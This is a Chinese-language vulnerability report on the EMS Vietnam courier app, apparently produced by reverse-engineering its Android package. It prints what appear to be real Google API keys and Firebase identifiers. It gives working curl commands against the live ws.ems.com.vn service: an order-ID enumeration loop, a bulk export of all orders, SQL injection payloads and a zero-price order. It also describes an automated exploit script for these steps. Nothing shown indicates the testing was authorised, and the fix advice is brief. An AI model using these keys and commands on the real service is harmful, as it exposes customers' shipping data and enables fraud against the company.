# EMS Vietnam Portal - 漏洞挖掘报告

## 执行摘要

通过对EMS越南快递APP (com.emsportal) 的完整逆向分析，发现多个高危和中危漏洞。

**关键发现**:
- ✅ 硬编码Google API密钥泄露
- ✅ Firebase配置暴露
- ✅ 完整API端点映射
- ⚠️ 疑似IDOR漏洞
- ⚠️ 认证机制弱点

---

## 漏洞详情

### 🔴 1. 硬编码API密钥泄露 (HIGH)

**位置**: `res/values/strings.xml`

**泄露信息**:
```xml
<string name="google_api_key">AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc</string>
<string name="google_api_key_v2">AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY</string>
<string name="default_web_client_id">452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com</string>
<string name="firebase_database_url">https://ems-khl-app-notify.firebaseio.com</string>
<string name="gcm_defaultSenderId">452955012352</string>
<string name="google_app_id">1:452955012352:android:1dd80597361aa0ed</string>
```

**影响**:
- Google Maps API配额滥用
- Firebase实时数据库潜在未授权访问
- GCM推送通知劫持

**验证Payload**:
```bash
# 测试Google Maps API
curl "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=10.762622,106.660172&radius=5000&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"

# 测试Firebase读权限
curl "https://ems-khl-app-notify.firebaseio.com/.json"
curl "https://ems-khl-app-notify.firebaseio.com/orders/.json"
curl "https://ems-khl-app-notify.firebaseio.com/users/.json"
```

**修复建议**:
- 使用Google Cloud API Key限制
- 实施Firebase安全规则
- 后端代理API请求

---

### 🔴 2. 潜在IDOR - 未授权订单访问 (HIGH)

**漏洞描述**: 
订单追踪API使用可预测的订单ID，可能允许未授权访问他人订单信息。

**受影响端点**:
```
GET /api/v1/orders/tracking/{order_id}
GET /api/v1/order-intl/tracking/{order_id}
```

**认证方式**:
```http
Authorization: Bearer {JWT_TOKEN}
```

**订单ID格式**:
- 国内: `EMS{9位数字}VN` (例: EMS123456789VN)
- 国际: 待确认格式

**攻击场景**:
```bash
# 1. 获取有效Token (正常登录)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 2. 遍历订单ID
for i in {100000000..100001000}; do
  ORDER_ID="EMS${i}VN"
  curl -s -H "Authorization: Bearer $TOKEN" \
    "http://ws.ems.com.vn/api/v1/orders/tracking/$ORDER_ID" \
    | jq -r 'select(.success==true) | .data'
done
```

**预期漏洞验证**:
- [ ] 能否访问非本人订单？
- [ ] 是否有速率限制？
- [ ] 订单ID是否连续/可预测？

**代码证据**:
```java
// LogInActivity.java:
String url = "http://ws.ems.com.vn/auth/login";
// 无设备指纹绑定

// b.java (网络层):
hashMap.put("Authorization", "Bearer " + b.u.a.G());
// Token从SharedPreferences获取，无二次校验
```

**修复建议**:
- 添加用户ID校验
- 使用UUID代替顺序ID
- 实施严格的访问控制列表(ACL)

---

### 🟡 3. 认证机制弱点 (MEDIUM)

**发现**:
1. **Token存储不安全**: 使用SharedPreferences明文存储
2. **无设备绑定**: Token可跨设备复用
3. **登录参数**: 仅需username/password，无2FA

**登录流程**:
```java
// POST http://ws.ems.com.vn/auth/login
{
  "username": "user@example.com",
  "password": "plaintext_password",
  "device_ime": "random_string",  // 无实际验证
  "device_type": "android"
}

// 响应:
{
  "success": true,
  "data": {
    "token": "JWT_TOKEN_HERE",
    "user": {...}
  }
}
```

**Token生命周期**:
```java
// Token过期处理
if (aVar.f3624b == 0) {
    Intent intent = new Intent("token expired");
    intent.putExtra("ACTION_RESET_APP", 0);
    AppController.f7472c.sendBroadcast(intent);
}
```

**攻击向量**:
- 抓包导出Token
- 跨设备重放攻击
- Session不失效

**修复建议**:
- 实施设备指纹绑定
- Token加密存储
- 添加多因素认证

---

### 🟡 4. 信息泄露 - 完整API映射 (MEDIUM)

**发现**: APK包含完整API端点清单 (68+ endpoints)

**关键端点**:

**订单操作** (业务核心):
```
POST /api/v1/orders/create
POST /api/v1/orders/create-v2
POST /api/v1/orders/cancel
POST /api/v1/orders/manual-cancel-order
POST /api/v1/orders/accept
GET  /api/v1/orders/list
GET  /api/v1/orders/summary
GET  /api/v1/orders/cod-by-date
POST /api/v1/orders/estimate-fee
```

**用户管理**:
```
PUT /api/v1/merchants/update
PUT /api/v1/merchants/update/password
PUT /api/v1/merchants/update-token
```

**工单系统**:
```
POST /api/v1/tickets/create
GET  /api/v1/tickets/list
PUT  /api/v1/tickets/update
```

**影响**:
- 攻击面完全暴露
- 便于自动化攻击
- 业务逻辑漏洞探测

---

### 🟡 5. 批量数据导出风险 (MEDIUM)

**发现**: 列表API可能无分页限制

**可能受影响**:
```
GET /api/v1/orders/list?limit=9999&offset=0
GET /api/v1/order-intl/list?limit=9999
GET /api/v1/inventory/list
GET /api/v1/tickets/list
```

**测试Payload**:
```bash
TOKEN="..."

# 尝试大量导出
curl -H "Authorization: Bearer $TOKEN" \
  "http://ws.ems.com.vn/api/v1/orders/list?limit=999999&offset=0" \
  -o all_orders.json
```

**修复建议**:
- 强制分页限制 (max 100)
- 添加导出频率限制
- 记录异常查询

---

### 🟢 6. SQL注入探测点 (LOW-UNCONFIRMED)

**潜在注入点**:
```
POST /api/v1/orders/suggest-address
POST /api/v1/orders/suggest-item
POST /api/v1/address/search
```

**测试Payload**:
```bash
# 时间盲注
curl -X POST "http://ws.ems.com.vn/api/v1/orders/suggest-address" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"keyword":"test\u0027 AND SLEEP(5)--"}'

# Union注入
curl -X POST "http://ws.ems.com.vn/api/v1/address/search" \
  -d '{"query":"1\u0027 UNION SELECT NULL,NULL,NULL--"}'
```

---

### 🟢 7. 价格篡改 (LOW-UNCONFIRMED)

**场景**: 创建订单时可能可篡改运费

**测试**:
```bash
curl -X POST "http://ws.ems.com.vn/api/v1/orders/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "sender_name": "Test",
    "receiver_name": "Test", 
    "weight": 10000,
    "price": 0,
    "fee": 1
  }'
```

---

## 攻击工具包

已生成 `/workspace/ems_exploit.sh` 自动化工具:

```bash
# 使用方法
./ems_exploit.sh

# 或自动扫描
./ems_exploit.sh --auto
```

**功能**:
1. 登录获取Token
2. IDOR订单遍历
3. 批量订单导出
4. Firebase未授权测试
5. Google API验证
6. SQL注入探测
7. 价格篡改测试

---

## 修复优先级

### 立即修复 (HIGH):
1. 移除硬编码API密钥
2. 验证IDOR并修复
3. 加强Token安全

### 短期修复 (MEDIUM):
1. 实施API速率限制
2. 添加设备绑定
3. 分页强制限制

### 长期优化 (LOW):
1. 参数化查询防注入
2. 业务逻辑审计
3. 渗透测试

---

## 免责声明

本报告仅用于安全研究和漏洞修复，请勿用于非法目的。

---

**分析日期**: 2025-11-02
**分析工具**: apktool, jadx, manual code review
**APK版本**: Latest (com.emsportal)
